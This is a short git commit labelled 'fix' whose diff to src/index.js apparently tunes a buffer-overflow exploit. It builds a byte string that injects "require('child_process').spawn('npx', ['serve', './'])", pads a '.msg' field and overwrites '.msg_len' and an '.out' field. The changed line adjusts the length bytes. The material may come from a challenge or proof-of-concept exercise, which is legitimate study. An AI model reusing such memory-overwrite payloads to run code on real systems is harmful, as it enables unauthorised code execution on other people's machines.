7a6a557c8b55c79b419dbe3f6c6205c4c2e1890d
Nayef Ghattas <nayef.ghattas@gmail.com>
2019-01-07 13:04:14 +0100

    fix

--- src/index.js
+++ src/index.js
@@ -9,7 +9,7 @@ sleep(150).then(() => {
       "require('child_process').spawn('npx', ['serve', './']);//" + // 57 bytes
       "       " + // + 7 to fill .msg = 64
       "  " + // + 2 for alignment = 66
-      "\x40\x00" + // + 2 bytes to fill .msg_len = 68
+      "\x40\x01" + // + 2 bytes to fill .msg_len = 68
       "\x05\x00\x00\x00" // + 4 bytes to overwrite .out= 72
     ),
     "i8",
